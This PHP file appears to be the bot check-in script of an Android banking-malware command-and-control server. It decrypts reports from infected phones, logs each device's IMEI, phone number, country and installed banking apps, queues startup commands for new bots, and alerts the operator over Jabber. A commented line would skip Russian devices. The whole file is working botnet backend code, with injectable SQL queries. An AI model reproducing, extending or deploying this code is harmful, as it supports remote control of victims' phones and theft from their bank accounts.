<?php
$request = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include 'crypt.php';
include 'db.php';
include 'admin/func.php';
$request = decrypt($request,cryptKey);

$massivReq = explode(":", $request);
$IMEI = $massivReq[0]; 
$phoneNumber = $massivReq[1]; 
$Version = $massivReq[2]; 
$country =$massivReq[3]; 
$bank = excludeApps($massivReq[4]);
$model = $massivReq[5]; 
$Version_apk = $massivReq[6];
#if (($country == "ru") or ($Version_apk == "")) return false;
#$IMEI = '000000011111222';
function goStartUpCommands($IMEI, $mysqli){
	# get startup commands from DB
	$commands_array = [];
	$get_commands_sql = "SELECT * FROM `com_config` WHERE `startup` = 1";
	$get_commands_sql_res = $mysqli->query($get_commands_sql);
	while($command_row = mysqli_fetch_assoc($get_commands_sql_res)) {
		$param1 = $command_row["startup_number"];
		$param2 = $command_row["startup_text"];
		//$commands_array[$command_row["name"]] = $command_row["command"];
		$command_ = $command_row["command"];
		if ($param1 != '' or $param2 != '') $command_ = sprintf($command_, $param1, $param2);
		$add_db_commands = $mysqli->query("INSERT INTO commands (IMEI,command) VALUE ('$IMEI','$command_')");
	}
}

$mysqli = new mysqli($db_host,$db_user,$db_pass,$db_name);

$sql = "SELECT * FROM kliets WHERE IMEI='$IMEI'";

$booleanIMEI = false;
foreach($mysqli->query($sql) as $row) {
	if($row['IMEI']==$IMEI){
		$booleanIMEI=true;	
		break;
	}
}
if($booleanIMEI == false) {
	$data = date('Y-m-d H:i');
	$add_data = $mysqli->query("INSERT INTO kliets (IMEI,number,version,country,bank,model,lastConnect,firstConnect) 
	value ('$IMEI','$phoneNumber','$Version','$country','$bank','$model','$data','$data')");
	
	$tag = "<tag>";
	$otv = encrypt("|OK|",cryptKey);
	$tagend = "</tag>";

	echo "$tag$otv$tagend";
	goStartUpCommands($IMEI, $mysqli);

	send_jabber_event('bot_event', $IMEI.":bot event newbot_imei:".$IMEI." newbot_country:".$country, $mysqli);
} else {
	$tag = "<tag>";
	$otv = encrypt("|NO|",cryptKey);;
	$tagend = "</tag>";

	echo "$tag$otv$tagend";
}
?>
